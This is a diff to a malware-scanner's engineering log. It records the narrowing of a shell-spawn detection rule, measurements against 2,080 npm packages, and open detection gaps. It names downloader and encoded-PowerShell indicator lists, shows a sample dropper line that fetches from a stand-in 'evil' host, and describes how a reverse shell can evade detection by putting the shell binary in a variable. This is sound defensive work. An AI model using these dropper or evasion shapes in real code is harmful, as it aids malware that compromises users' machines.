@@ -2520,7 +2520,7 @@ each is a separate rule family with its own calibration burden. Ranked by severi
 
 ## Open follow-ups (surfaced by the F35 corroboration pass, not yet worked)
 
-- F38. [ ] **`shell process spawned` calls `powershell -NoProfile -Command` an
+- F38. [x] **`shell process spawned` calls `powershell -NoProfile -Command` an
   attack** — this is why `vite` is still DO NOT INSTALL after F35, and it is the
   larger of the two remaining false-danger classes: the pattern is
   *always*-dangerous (a verdict on its own, no corroboration needed) AND a
@@ -2542,6 +2542,53 @@ each is a separate rule family with its own calibration burden. Ranked by severi
   real packages — measure it before trusting that. Note the split roles: even if
   it stays always-dangerous, removing it from `CONTEXT_DESCRIPTIONS` alone would
   drop 5 of the 6 vite lines.
+  **Done.** Measured first, over a wider corpus than the task assumed:
+  **2,080 unique installed packages, 82,677 scanned files** (the same phase-5
+  file selection, six real `node_modules` trees). The old pattern produces
+  **4 hits across 3 packages and all four are support code** — `vite`'s
+  `execSync('powershell -NoProfile -Command "[Console]::OutputEncoding=…"')`,
+  `app-builder-lib`'s `exec("powershell.exe", ["-NoProfile", "-NonInteractive",
+  "-Command", "Get-Command pwsh.exe"])`, and **`next` twice**, which the task did
+  not know about: the dev overlay's open-in-editor launcher runs
+  `spawn("cmd.exe", ["/C", editor].concat(args))`. Zero true positives.
+  The replacement is the union the task proposed, spelled as three arms of one
+  pattern. **(1) No command at all** — the shell binary is the entire first
+  argument and the argv is absent or an empty array (`spawn('/bin/sh', [])`).
+  Support code always passes a command, so this is the separator; `next` is why
+  the arm requires an argv that is *empty* rather than short. **(2) A command
+  line carrying a downloader** — `curl`/`wget`/`certutil`/`bitsadmin`/
+  `Net.WebClient`/`DownloadString`/`/dev/tcp`/`nc -e`/`base64 -d` within
+  `SHELL_COMMAND_WINDOW` (200) characters of the shell binary, bounded to the
+  same LINE so it cannot reach into an unrelated statement. **(3) A PowerShell
+  command line carrying an encoded payload** — `-enc`/`-ec`/`-e`/
+  `EncodedCommand`/`FromBase64String`. Arm 3 is PowerShell-only on purpose:
+  `-ec` and `-e` are also POSIX shell flags, and `bash -ec "npm run build"` is a
+  real build idiom (a fixture). Arms 2 and 3 read past the first string literal
+  to the rest of the line, which is new coverage — `execFile('cmd.exe', ['/c',
+  'curl …'])` was invisible to the old first-literal-only pattern.
+  Two mistakes the measurement caught. The bare `sh` alternative had no leading
+  boundary, so it matched inside `npm publish` — the shell token now needs
+  either a real `/bin/` path or a word boundary (a regression test pins
+  `execSync('npm publish … && curl …')`). And repeating the call prefix once per
+  arm made the pattern **4x slower** on real bundles (1.09s -> 4.24s over
+  23.5 MB), because the engine rescans the file per alternative; factoring the
+  prefix out and dropping the redundant `(?:\.|\b)` for a plain `\b` brings it to
+  **0.88s, faster than the 1.07s pattern it replaces**.
+  Result over the corpus, re-run with the **shipped** regex read straight off
+  `MALWARE_PATTERN_TABLE` rather than a candidate string (same 2,080 packages /
+  82,677 files): old **4** file hits across 3 packages, new **0** across 0, with
+  every malicious fixture still a DANGER (the reverse shell and the
+  `cmd.exe /c curl` dropper both depended on this rule alone). The rule keeps BOTH roles —
+  always-dangerous and a `CONTEXT_DESCRIPTIONS` member — because the narrowing
+  removes the false escalations at the source rather than by demoting a real
+  signal; a test pins that `vite`'s shape now escalates nothing while the reverse
+  shell still escalates its capabilities. 38 new tests (14 attacker shapes,
+  10 benign shapes incl. all three real packages verbatim, the word-boundary and
+  cross-line guards, the corroboration pair, the F43 line-bound gap pinned as a
+  known limit, plus 5 new corpus fixtures in the shared benign/malicious
+  baselines); full suite **3,469 passed / 2 skipped**
+  (was 3,431/2), `ruff` and `mypy` clean, coverage **44.70%** over the 28% floor,
+  CI self-scan gate exit 0.
 
 - F39. [ ] **`@types/node` is reported as a keylogger** — the third package in
   the post-F35 residue, and the cheapest of the three. `keylogger indicators`
@@ -2605,6 +2652,40 @@ each is a separate rule family with its own calibration burden. Ranked by severi
   deciding between calibrating the tier and grouping the summary by
   description. Do not guess at the number: the whole point of F37 was that the
   base rate here is far lower than it looks.
+
+## Open follow-ups (surfaced by the F38 shell-narrowing pass, not yet worked)
+
+- F43. [ ] **The payload arms stop at the end of the line, and real source is
+  formatted** — arms 2 and 3 read from the call's opening quote to at most
+  `SHELL_COMMAND_WINDOW` characters, bounded to one LINE. That bound is what
+  keeps the check inside its own statement, and it is right for a minified
+  bundle, where a whole call is one line. It is wrong for pretty-printed source:
+  the exact shape the pass added coverage for —
+  `spawn("cmd.exe", ["/C", "curl http://evil/a.exe -o a.exe"])` — is invisible
+  the moment prettier splits the argv over four lines, which is precisely how
+  `next` ships the benign version of it. So the new coverage lands on published
+  bundles and misses readable source. A newline-tolerant window is the obvious
+  fix and the obvious risk: `[\s\S]` reaches into the next statement, which is
+  how the F35 wiring window had to be capped and measured. Worth measuring a
+  small multi-line window (the call's own argv rarely exceeds ~6 lines) against
+  the same 2,080-package corpus before widening anything, and worth pinning the
+  gap with a currently-failing-by-design fixture either way.
+
+- F44. [ ] **A reverse shell whose binary is a variable is invisible** — arm 1
+  requires the shell name as a string literal (`spawn('/bin/sh', [])`). The same
+  attack written `const bin = process.env.SHELL; spawn(bin, [])` matches nothing
+  — measured end to end, the full reverse-shell file (net.connect, the spawn,
+  both pipes) yields four hits and **zero dangers**. Not a regression: the
+  pre-F38 pattern required a literal too, so this hole is as old as the rule and
+  the narrowing neither opened nor closed it. It is a real hole all the same,
+  and not a calibration question — the literal is an attacker convenience, not a
+  requirement. Note the honest difficulty before reaching for it — `spawn(cmd,
+  args)` with two opaque locals is the single most common shape in build
+  tooling, so a rule that fires on it condemns everything. The tractable subset
+  is a variable whose *assignment* is a shell literal or a known shell-valued
+  env var (`process.env.SHELL`/`ComSpec`) within a short window of the spawn,
+  which is a small dataflow step rather than a wider pattern. Measure the
+  assignment form's base rate over the corpus first.
 
 ---
 
